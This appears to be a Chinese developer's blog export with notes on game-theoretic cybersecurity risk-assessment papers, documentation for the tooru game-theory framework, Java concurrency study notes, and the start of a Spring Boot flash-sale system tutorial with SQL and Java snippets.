    <title>A Bayesian network approach for cybersecurity risk assessment implementing and extending the FAIR model</title>
    <url>/2020/12/17/post/</url>
    <content><![CDATA[<h2 id="A-Bayesian-network-approach-for-cybersecurity-risk-assessment-implementing-and-extending-the-FAIR-model"><a href="#A-Bayesian-network-approach-for-cybersecurity-risk-assessment-implementing-and-extending-the-FAIR-model" class="headerlink" title="A Bayesian network approach for cybersecurity risk assessment implementing and extending the FAIR model"></a>A Bayesian network approach for cybersecurity risk assessment implementing and extending the FAIR model</h2><p>使用贝叶斯网络来扩展公平模型（fair model），定量风险评估</p><h4 id="已有工作"><a href="#已有工作" class="headerlink" title="已有工作"></a>已有工作</h4><p>FAIR用于评估智能电网网络威胁的损失事件频率，2019</p><p>Park等人使用FAIR来评估Andriod恶意软件的威胁，2018</p><h4 id="典型的CRA（风险评估）方法"><a href="#典型的CRA（风险评估）方法" class="headerlink" title="典型的CRA（风险评估）方法"></a>典型的CRA（风险评估）方法</h4><ul><li>威胁树，2002</li><li>攻击树，1999</li><li>攻击图，2002</li><li>防御树，2006</li><li>贝叶斯攻击图，2012</li></ul><h4 id="博弈论模型存在的问题"><a href="#博弈论模型存在的问题" class="headerlink" title="博弈论模型存在的问题"></a>博弈论模型存在的问题</h4><p>信息的缺乏和不对称：</p><ul><li>不知道攻击者的策略和payoff</li><li>很难指导风险管理者进行决策和评估</li></ul><p><strong>考虑将博弈模型和统一收益模型相结合</strong>：将博弈论模型和FAIR-BN相结合，可以支持防御者-攻击博弈中防御者部署的决策，并预测网络攻击造成的损失。</p><h4 id="博弈模型"><a href="#博弈模型" class="headerlink" title="博弈模型"></a>博弈模型</h4><p>借用Banks,2015的序列防御-攻击博弈模型来构建EFBN</p><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/20201217124527.png" alt="image-20201214144236665"></p><p>决策分析的目标是使得决策者的效用节点最大化，可以使用<code>AgenaRisk</code>生成决策树（Fenton,Neil,2018）</p><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/20201217124535.png" alt="image-20201214145447986"></p><h2 id="A-Hybrid-Game-Theory-and-Reinforcement-Learning-Approach-forCyber-Physical-Systems-Security"><a href="#A-Hybrid-Game-Theory-and-Reinforcement-Learning-Approach-forCyber-Physical-Systems-Security" class="headerlink" title="A Hybrid Game Theory and Reinforcement Learning Approach forCyber-Physical Systems Security"></a>A Hybrid Game Theory and Reinforcement Learning Approach forCyber-Physical Systems Security</h2><p>基于博弈论和多智能体强化学习在战略和战场两个维度去考量。</p><ul><li>使用预定义漏洞和已发现漏洞</li><li>使用MARL和Q-learning推导最有攻击序列和防御策略</li></ul><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>MARL（多代理agent强化学习） [6]被认为是博弈论的改编，具有机器学习的附加功能，可以使用深度强化学习在内的多种算法来学习最优策略，也就是收敛到nashEQ</p><p>强化学习案例：</p><ul><li>R. Elderman, L. J. Pater, A. S. Thie, M. M. Drugan, and M. Wiering,“Adversarial reinforcement learning in a cyber security simulation.,” inICAART (2), pp. 559–566, 2017</li><li>. Huang, C. Zhou, Y. Qin, and W. Tu, “A game-theoretic approachto cross-layer security decision-making in industrial cyber-physicalsystems,”IEEE Transactions on Industrial Electronics, 2019.</li></ul><h4 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h4><blockquote><p>战略层面</p></blockquote><p>我们使用不完善的信息广泛形式博弈对战略水平进行建模。 此游戏的状态为总体安全状态：低，中，高和严重危险。 显然，防御者不确定确切的状态是什么（例如，攻击者发现了零日漏洞）。 攻击者不知道状态是什么，因为他没有有关目标网络的全部信息或所有防御者的对策。 因此，我们认为信息模型不完善。 该游戏具有扩展形式，因为防御者将尝试从腐败状态恢复到原始（低）状态。攻击者将尝试达到关键状态。 因此，游戏具有多个阶段。 防御者根据对策选择策略，以阻止攻击者的前进。 该策略被转化为一系列在战场上可以选择的行动。 攻击者根据攻击方法选择策略。 攻击者策略被翻译为战场级别的一组动作，漏洞和渗透工具。</p><blockquote><p>战场层面</p></blockquote><p>采用MARL。包含一个主机和四个子网构成的CPS</p><ul><li>三个子网在云端，拥有IDS。安全影响较低</li><li>其它子网托管在本地，IDS具有不确定性易受到攻击。中等的影响</li><li>SCADA网络，具有高安全性影响。</li></ul><p>漏洞评分系统（CVSS）：“Common vulnerability scoring system.” <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmlyc3Qub3JnL2N2c3Mv">https://www.first.org/cvss/<i class="fa fa-external-link-alt"></i></span>. Ac-cessed: 2019-08-02</p><p>一个典型的CPS子网有关的漏洞。</p><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/20201217124601.png" alt="image-20201214161605578"></p><blockquote><p>病毒传播模型</p></blockquote><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/20201217124612.png" alt="image-20201214162451037" style="zoom:80%"><p>攻击者在攻击过程收集信息。</p><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h4><p>首先使用基于Q-learning的RL寻找最优攻击路径；进一步，将MARL处理Q-learning应用于两个agent以到达NE，并找到最佳防御策略</p><h4 id="博弈法制"><a href="#博弈法制" class="headerlink" title="博弈法制"></a>博弈法制</h4><p>使用以下6元组定义：14x6game model matrix (14 nodes, five vulnerabilities, level ofprotection)</p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/20201217124625.png" alt="image-20201214170439931" style="zoom:80%"><ul><li>参数 $W$ ：如果IDS检查到病毒，返回1，否则返回0</li><li>参数 $T$：是否终止</li><li>参数 $Y$：攻击者的步长</li><li>参数 $V$：攻击成功率</li><li>参数 $N$：最后一个节点的index</li></ul><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/20201217124631.png" alt="image-20201214171756461" style="zoom:80%"><blockquote><p>攻击者的目标状态：</p></blockquote><p>攻击成功率 $V$ 应超过漏洞可利用性得分 $P$，形式化描述为：</p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/20201217124637.png" alt="image-20201214172035386" style="zoom:80%"><blockquote><p>防御者目标状态：</p></blockquote><p>对于防御者的目标状态，在两种情况下游戏被认为是吉祥的：首先，只要攻击者的行动成功不超过最后节点上的转移概率，并且IDS检测到攻击，然后将其阻止； 第二，超过最大攻击步数时，形式化描述：</p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/20201217124642.png" alt="image-20201214172705724" style="zoom:80%"><h4 id="架构图"><a href="#架构图" class="headerlink" title="架构图"></a>架构图</h4><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/20201217124647.png" alt="image-20201214174103354" style="zoom:80%"><p>学习算法基于table表示法而不是神经网络，因为神经网络存在对抗性学习问题，即对不断变化的环节适应很慢。</p><h4 id="学习参数"><a href="#学习参数" class="headerlink" title="学习参数"></a>学习参数</h4><ul><li>学习率：描述新值和旧值的比较程度</li><li>折现因子：影响未来奖励的权值。</li><li>衰减率：确定勘探与开发之间的权衡。</li></ul><p>Q-tables会在每个game策略中更新。</p><h4 id="战略与策略"><a href="#战略与策略" class="headerlink" title="战略与策略"></a>战略与策略</h4><p>图4给出了使用博弈论和 MARL的想法;它将博弈论中的策略概念与RL 中的政策概念联系起来。首先基于博弈论原理对 CPS网络中所面临的问题进行建模和形式化。每个玩家都定义了相应的策略和行动空间。同时，通过使用MARL，将博弈模型的形式化应用到环境中，使用Q-learning算法来应用学习过程。此外，对所选择的策略推导出最优策略。</p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/20201217124654.png" alt="image-20201214181647793" style="zoom:80%">]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>强化学习</tag>
        <tag>博弈论</tag>
      </tags>
  </entry>
  <entry>
    <title>tooru框架</title>
    <url>/2020/12/16/tooru%E6%A1%86%E6%9E%B6/</url>
    <content><![CDATA[<h1 id="经典静态博弈"><a href="#经典静态博弈" class="headerlink" title="经典静态博弈"></a>经典静态博弈</h1><p>经典静态博弈是所有博弈的基础，在这一部分中，我们将描述所有博弈的基本内容。</p><h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><p>一个可选字段，关键字是 <code>title</code>，值类型是<code>字符串</code>。</p><p>顾名思义，是一个博弈的标题。这个字段不会影响内部分析计算，它只被用于帮助使用者理解输出</p><h2 id="评论"><a href="#评论" class="headerlink" title="评论"></a>评论</h2><p>一个可选字段，关键字是 <code>comment</code>，值类型是<code>字符串</code>。</p><p>顾名思义，是对于一个博弈、文件、项目的进一步之描述。这个字段不会影响内部分析计算，它只被用于帮助使用者理解输出</p><h2 id="博弈类型"><a href="#博弈类型" class="headerlink" title="博弈类型"></a>博弈类型</h2><p>一个必需字段，关键字是 <code>game_type</code>，值类型是<code>字符串</code>。</p><p>顾名思义，是该博弈的类型。目前程序支持的博弈类型有：</p><ul><li>经典静态博弈（由 <code>csg</code> 指代）</li><li>重复博弈（由 <code>rpg</code> 指代）</li><li>进化博弈（由 <code>evo</code> 指代）</li><li>随机博弈（）不完全分析计算支持</li><li>经典动态博弈（）</li><li>贝叶斯博弈（）</li></ul><a id="more"></a><h2 id="回报"><a href="#回报" class="headerlink" title="回报"></a>回报</h2><p>一个必需字段，关键字是 <code>payoffs</code>，值类型是<code>列表</code>，数组元素值类型是<code>字符串</code>或以数组表示的<code>矩阵</code>。</p><p>列表决定了您可以定义复数个回报，将其关联到不同的参与者类型上。<code>*toml*</code> <em>规范不支持非同质列表</em>。</p><p>字符串定义的回报意味着这是一个特定参与者的效用函数，这个字符串必须是一个合法的 <code>lua</code> 表达式（算式），因为它最终会被编译成可执行代码段。在经典静态博弈中，您可以使用 <code>CHOICE[x]</code> 来表示第 <code>x</code> 个参与者的决策/行为；您可以使用 <code>SELF</code> 来表示回报计算对象自身的索引。所有其他信息、内/外部模块都无法在这段算式中获得。如果您需要更加复杂的效用函数，请使用 <code>lua</code> 接口。另外请注意<strong>供您使用的预设值是只读的，程序不会察觉算式的合法性，直到它得到执行之后</strong>。</p><p>矩阵定义的回报意味着这是一个回报矩阵。<strong>若是您提供（初始）全局回报矩阵，请务必将其置于回报列表的第一位</strong>；当然您也可以提供某一类型参与者的回报矩阵。列表中回报值是按照博弈结果排序。</p><h2 id="数值开关"><a href="#数值开关" class="headerlink" title="数值开关"></a>数值开关</h2><p>一个必需字段，关键字是 <code>value_switch</code>，值类型是<code>整数</code>。</p><p>当改字段值为 <code>0</code> 时开关为关；否则开关打开。该开关影响到行为空间定义中的值类型：开关打开是行为空间以数值定义，该数值配合回报定义中的算式将参与到回报的计算中。但是当存在全局回报矩阵时，回报计算会以全局回报矩阵为准，直到在运行时回报定义被修改，此时回报将被重新计算；反之行为空间以标签定义，它只是行为的标注，回报一定由回报矩阵给出。</p><h2 id="行为"><a href="#行为" class="headerlink" title="行为"></a>行为</h2><p>一个必需字段，关键字是 <code>action_sets</code>，值类型是<code>列表</code>，数组元素值类型是<code>数组</code>，列表元素的值类型是<code>字符串</code>或<code>实数</code>，这取决于数值开关。</p><p>该列表表示了一个行为集合，被用于定义不同的参与者类型。</p><h2 id="参与者类型"><a href="#参与者类型" class="headerlink" title="参与者类型"></a>参与者类型</h2><p>一个必需字段，关键字是 <code>types</code>，值类型是<code>数组</code>（<code>toml</code> 下是以空白字符分割的<code>字符串</code>）。</p><p>它有着特定的协议：一种类型以连续的四个元素表示，依次为标签（<code>字符串</code>）、是该类型的参与者数量（<code>整数</code>）、行为空间索引（<code>整数</code>）、回报索引（<code>整数</code>）。</p><h1 id="重复博弈"><a href="#重复博弈" class="headerlink" title="重复博弈"></a>重复博弈</h1><p>重复博弈是对于经典静态博弈的扩展，本章仅描述这些扩展的部分。</p><h2 id="重复时间"><a href="#重复时间" class="headerlink" title="重复时间"></a>重复时间</h2><p>关键字是 <code>stop</code>，值类型是<code>整数</code>或<code>浮点</code>。</p><p>当其为<code>整数</code>值时，重复博弈将在进行这些次数后终止，<code>0</code> 意味着博弈没有结束。</p><p><code>浮点</code>值表示折现因子，这个因子有几个可用的解释。总之，程序中的折现因子表征在每一次博弈后整个重复博弈继续进行的概率。</p><h2 id="策略"><a href="#策略" class="headerlink" title="策略"></a>策略</h2><p>关键字是 <code>strategies</code>，值类型是<code>列表</code>，列表元素根据情况有所不同。</p><p>这个字段的定义有一个特定的协议：一个策略由三个连续元素表示。按照顺序有标签（<code>string</code>），由空格分隔的注册表键值对列表（<code>string</code>）和策略源代码（<code>string</code>）。</p><p>注册表中的每一个键值对（<code>&lt;hot&gt;=&lt;dog&gt;</code>），<code>&lt;hot&gt;</code> 是注册项的名字。这个名字只可以由二十六个大写英文字母、小写英文字母、十个阿拉伯数字与下划线组成，<code>&lt;dog&gt;</code> 是注册项的初始赋值，这个值包含<strong>除去空白字符之外</strong>的所有字符。当它能够被解析为一个实数时，他将被视为实数时否则它就是一个字符串。值得注意的是单双引号不应该被用于包围字符串，这将导致它们也被解析为字符串的一部分。</p><p>策略源代码是 <code>lua</code> 源代码，且必须是合法的 <code>lua</code> 源代码。只有语法错误能够被程序检查，运行时错误只能在真正运行时被捕获并且会导致计算失败。这段代码只能够访问有限的全局变量：注册表项、博弈实例、参与者的全局索引以及 lua 中的数学计算库。关于博弈模型的内容参考文件 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1hpYW5nc29uZy1HdWFuL1Rvb3J1L2Jsb2IvbWFzdGVyL2RvYy9saW50ZXJmYWNlLnpoLm1k">linterface<i class="fa fa-external-link-alt"></i></span>。</p><p>策略控制着参与者在整个重复博弈进行中的行为选择模式。</p><h1 id="进化博弈"><a href="#进化博弈" class="headerlink" title="进化博弈"></a>进化博弈</h1><p>进化博弈是对重复博弈的扩展，不过它会删除重复博弈中对于策略字段的定义。</p><h2 id="选择强度"><a href="#选择强度" class="headerlink" title="选择强度"></a>选择强度</h2><p>关键字是 <code>selection_intensity</code>，值类型是<code>非负实数</code>。</p><p>选择强度影响自然选择的强度，强度越大意味着劣势群体越可能被淘汰，他们规模缩小的速度也可能会更快。</p><h2 id="变异强度"><a href="#变异强度" class="headerlink" title="变异强度"></a>变异强度</h2><p>关键字是 <code>mutations_intensity</code>，值类型是<code>比例</code>。</p><p>变异强度越大意味着变异越有可能发生。</p><h2 id="初始分布"><a href="#初始分布" class="headerlink" title="初始分布"></a>初始分布</h2><p>关键字是 <code>init_distri</code>，值类型是<code>列表</code>，元素值类型是<code>比例</code>或<code>整数</code>。</p><p>当元素值包含小数点时，它被认为是表示群体数量在总体中的比例；或它是一个整数，表示群体的数量。</p><h2 id="模拟群体数量"><a href="#模拟群体数量" class="headerlink" title="模拟群体数量"></a>模拟群体数量</h2><p>关键字是 <code>simulation_population</code>，值类型是<code>非负整数</code>。</p><p>顾名思义。<code>0</code> 意味着群体是无限的。</p>]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>博弈论</tag>
      </tags>
  </entry>
  <entry>
    <title>并发编程</title>
    <url>/2020/11/05/%E2%80%9D%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B%E2%80%9C/</url>
    <content><![CDATA[<p>– 阅读《并发编程的艺术》所写</p><h4 id="并发的挑战"><a href="#并发的挑战" class="headerlink" title="并发的挑战"></a>并发的挑战</h4><ul><li><p>上下文切换带来的时间消耗</p><p>策略：</p><ul><li>使用无锁并发编程。如数据分段，不同线程处理不同分段</li><li>CAS算法。</li><li>避免创建不必要的线程。如降低JBOSS的maxThreads</li><li>使用协程。</li></ul></li><li><p>死锁</p><ul><li>避免一个线程获取多个锁</li><li>尝试使用定时锁</li></ul></li></ul><a id="more"></a><h4 id="并发机制的底层实现"><a href="#并发机制的底层实现" class="headerlink" title="并发机制的底层实现"></a>并发机制的底层实现</h4><blockquote><p>volatile</p></blockquote><p>volatile是轻量级的synchronized，用于保证共享变量的可见性（即一个线程修改变量时，另一个能够读取到修改后的值）。</p><p>底层原则：</p><ul><li>使用Lock前缀指令来引起处理器缓存回写到内存中。</li><li>一个处理器的缓存回写到内存中会导致其它处理器的缓存无效。</li></ul><blockquote><p>synchronized</p></blockquote><p>Java中每一个对象都可以作为锁。</p><ul><li>对于普通同步方法，锁时当前实例对象。</li><li>对于静态同步方法，锁时当前类的Class对象。</li><li>对于同步方法块，锁时Synchronized里面配置的对象。</li></ul><p>JDK1.6为了减少<code>获取和释放锁的性能消耗</code>，引入了<code>偏向锁</code>和<code>轻量级锁</code>，</p><p>所以一共有4种锁状态，由低到高：</p><ul><li>无锁状态</li><li>偏向锁状态<ul><li>偏向锁原理：研究发现大多数情况下只有<strong>同一线程多次获取锁的情况</strong>，为了降低获取锁的代价引入了偏向锁。其原理是，当一个线程访问同步代码块并获取锁时，会在Java对象头和栈帧的锁记录里面存放<code>当前锁偏向的线程ID</code>，下次再次访问时，不要进行CAS操作，只需要简单测试对象头是否存储了指向该线程的偏向锁即可。如果成功，表示已经获取了锁。如果失败，看<code>偏向锁的标志位</code>是否为1（表示当前是偏向锁），如果没有则用CAS竞争锁，如果设置了则尝试使用CAS将对象头的偏向锁指向当前线程。</li><li>偏向锁的撤销：由于偏向锁不适用于多个线程对锁的竞争，故当其他线程尝试竞争偏向锁时，持有偏向锁的线程会释放锁。</li><li>关闭偏向锁：JDK1.6以上默认开启偏向锁，如果认为锁通常处于竞争状态可以关闭偏向锁。</li><li>个人理解：偏向锁用于只有一个线程访问同步代码块的场景。</li></ul></li><li>轻量级锁状态。<ul><li>加锁过程：在线程执行同步代码块之前，<strong>JVM会先在当前线程的栈帧中创建存储锁记录的空间，然后复制对象头（竞争的锁对象）的Mark Word到其中</strong>。然后尝试用CAS将对象头的Mark Word<code>替换为指向锁记录的指针</code>，成功则获取锁，失败则表示其它线程在竞争，尝试<code>自旋</code>获取锁</li><li>解锁过程：<strong>使用CAS将原理复制的记录替换回Mark Word</strong>，如果成功表示没有竞争，失败则表示存在竞争，锁会膨胀为重量级锁。</li><li>个人理解：<strong>线程在竞争锁时，先copy一份对象头的记录到栈空间作为备份，然后用CAS取修改对象头记录，使其指向自己，之所以该过程为轻量级锁，原因在于参与竞争的线程不会直接阻塞，而是可以使用自旋来尝试获取锁</strong>（缺点是会消耗CPU资源）。适用于同步代码块执行速度很快的场景。</li></ul></li><li>重量级锁<ul><li>适用于同步块执行时间较长的场景。</li></ul></li></ul><p>锁可以升级，不能降级，防止无用的自旋（如线程阻塞）</p><blockquote><p>CAS</p></blockquote><p>比较并交换，CAS操作需要两个值，一个旧值和一个新值，在操作期间先比较旧值有没有发生变化，如果没有发生变化才换成新值。</p><blockquote><p>原子操作</p></blockquote><p>从jdk1.5开始，并发包提供了原子操作类：AtomicBoolean、AtomicInteger、AtomicLong。</p><p><strong>CAS实现原子操作面临的三大问题：</strong></p><ol><li><p>ABA问题：A变B再变A，CAS认为A没有发生变化，实际上却变化了。解决办法是在变量更新时添加版本号：如JDK1.5添加的AtomicStampedReference类（<code>reference代表引用</code>）的compareAndSet方法在检查值引用的同时会检查当前<code>标志</code>是否等于预期标志</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">boolean</span> compareAndSet&#123;</span><br><span class="line">	V exceptedReference, <span class="comment">//预期引用</span></span><br><span class="line">	V newReference, <span class="comment">//更新后的引用</span></span><br><span class="line">	<span class="keyword">int</span> exceptedStamp, <span class="comment">//预期标志</span></span><br><span class="line">	<span class="keyword">int</span> newStamp <span class="comment">//更新后的标准</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>CAS自旋带来的CPU执行消耗。</p></li><li><p>只能保证一个共享变量的原子操作。解决办法是多个变量合并为一个或者放在一起，如JDK1.5提供的AtomicReference类保证引用对象之间的原子性，即把多个变量放在一个对象中进行CAS操作。</p></li></ol><h4 id="Java内存模型"><a href="#Java内存模型" class="headerlink" title="Java内存模型"></a>Java内存模型</h4>]]></content>
      <categories>
        <category>多线程</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>秒杀系统设计</title>
    <url>/2020/08/16/%E7%A7%92%E6%9D%80%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/</url>
    <content><![CDATA[<h2 id="项目构成"><a href="#项目构成" class="headerlink" title="项目构成"></a>项目构成</h2><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200816092422127.png" alt="分层设计" style="zoom:67%"><a id="more"></a><p>三层模型</p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200816093027664.png" alt="三层模型" style="zoom:80%"><p>UML图</p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200816093308985.png" alt="UML图" style="zoom:50%"><h2 id="秒杀项目搭建"><a href="#秒杀项目搭建" class="headerlink" title="秒杀项目搭建"></a>秒杀项目搭建</h2><p>目标：</p><ul><li>使用IDEA + Maven搭建SpringBoot开发环境</li><li>集成MyBatis操作数据库</li><li>实现秒杀项目</li></ul><h4 id="创建数据库表结构"><a href="#创建数据库表结构" class="headerlink" title="创建数据库表结构"></a>创建数据库表结构</h4><blockquote><p>user_info表，注意下面字段不包含用户密码，企业中一般密码是单独的表</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for user_info</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`user_info`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`user_info`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`name`</span> <span class="built_in">varchar</span>(<span class="number">64</span>) <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span>,</span><br><span class="line">  <span class="string">`gender`</span> <span class="built_in">tinyint</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'1代表男性，2代表女性'</span>,</span><br><span class="line">  <span class="string">`age`</span> <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span>,</span><br><span class="line">  <span class="string">`telphone`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`register_mode`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'注册方式：手机号、微信、支付宝'</span>,</span><br><span class="line">  <span class="string">`third_party_id`</span> <span class="built_in">varchar</span>(<span class="number">64</span>) <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 <span class="keyword">COLLATE</span>=utf8_unicode_ci;</span><br></pre></td></tr></table></figure><blockquote><p>user_password表，关联user_info主键</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for user_password</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`user_password`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`user_password`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`encrpt_password`</span> <span class="built_in">varchar</span>(<span class="number">128</span>) <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span>,</span><br><span class="line">  <span class="string">`user_id`</span> <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 <span class="keyword">COLLATE</span>=utf8_unicode_ci;</span><br></pre></td></tr></table></figure><blockquote><p>使用mybatis-genrator自动生产相关Object和mapper映射接口，xml映射文件</p></blockquote><h4 id="领域对象模型"><a href="#领域对象模型" class="headerlink" title="领域对象模型"></a>领域对象模型</h4><p>即在service创建用户model，UserServiceImpl返回的是用户model对象。</p><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200817103045731.png" alt="服务层"></p><h4 id="异常处理机制"><a href="#异常处理机制" class="headerlink" title="异常处理机制"></a>异常处理机制</h4><blockquote><p>创建异常接口、异常枚举类、Exception继承类（用于抛出异常）</p></blockquote><ul><li><strong>设计模式：包装器业务异常类实现</strong></li></ul><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200818094613465.png" alt="错误处理"></p><blockquote><p>在控制层UserController抛出异常（继承BaseController）</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> BusinessException(EmBusinessError.USER_NOT_EXIST);</span><br></pre></td></tr></table></figure><blockquote><p>在基类控制层BaseController拦截异常，并返回CommonReturnType</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="meta">@ExceptionHandler</span>(Exception<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">    @<span class="title">ResponseStatus</span>(<span class="title">HttpStatus</span>.<span class="title">OK</span>)</span></span><br><span class="line"><span class="class">    @<span class="title">ResponseBody</span></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">Object</span> <span class="title">handlerException</span>(<span class="title">HttpServletRequest</span> <span class="title">request</span>, <span class="title">Exception</span> <span class="title">ex</span>) </span>&#123;</span><br><span class="line">        Map&lt;String, Object&gt; responseData = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (ex <span class="keyword">instanceof</span> BusinessException) &#123;</span><br><span class="line">            <span class="comment">//强转为BusinessException</span></span><br><span class="line">            BusinessException businessException = (BusinessException) ex;</span><br><span class="line"></span><br><span class="line">            responseData.put(<span class="string">"errCode"</span>, businessException.getErrCode());</span><br><span class="line">            responseData.put(<span class="string">"errMsg"</span>, businessException.getErrMsg());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            responseData.put(<span class="string">"errCode"</span>, EmBusinessError.UNKONWN_ERROR.getErrCode());</span><br><span class="line">            responseData.put(<span class="string">"errMsg"</span>, EmBusinessError.UNKONWN_ERROR.getErrMsg());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> CommonReturnType.create(responseData, <span class="string">"fail"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="用户信息管理"><a href="#用户信息管理" class="headerlink" title="用户信息管理"></a>用户信息管理</h4><p>◆otp短信获取<br>◆otp注册用户<br>◆用户手机登陆</p><blockquote><p>短信获取—控制层</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//用户获取otp短信接口</span></span><br><span class="line"><span class="comment">//post方式，consumes为application/x-www-form-urlencoded</span></span><br><span class="line"><span class="meta">@PostMapping</span>(value = <span class="string">"/getotp"</span>, consumes = CONTENT_TYPE_FORMED)</span><br><span class="line"><span class="meta">@CrossOrigin</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> CommonReturnType <span class="title">getOtp</span><span class="params">(@RequestParam(<span class="string">"telphone"</span>)</span>String telphone)</span>&#123;</span><br><span class="line">    <span class="comment">//需要参照一定的规则生成OTP验证码</span></span><br><span class="line">    Random random = <span class="keyword">new</span> Random();</span><br><span class="line">    <span class="keyword">int</span> randomInt = random.nextInt(<span class="number">99999</span>);<span class="comment">//随机数范围[0-99999）</span></span><br><span class="line">    randomInt +=<span class="number">10000</span>;</span><br><span class="line">    String otpCode = String.valueOf(randomInt);</span><br><span class="line">    <span class="comment">//将OTP验证码同对应的手机号关联</span></span><br><span class="line">    httpServletRequest.setAttribute(telphone, otpCode);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将OTP验证码通过短信通道发送给用户（第三方服务，这里省略）</span></span><br><span class="line">    log.info(<span class="string">"telphone = "</span> + telphone + <span class="string">" &amp; otpCode = "</span> + otpCode);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> CommonReturnType.create(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>短信校验—服务层</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span 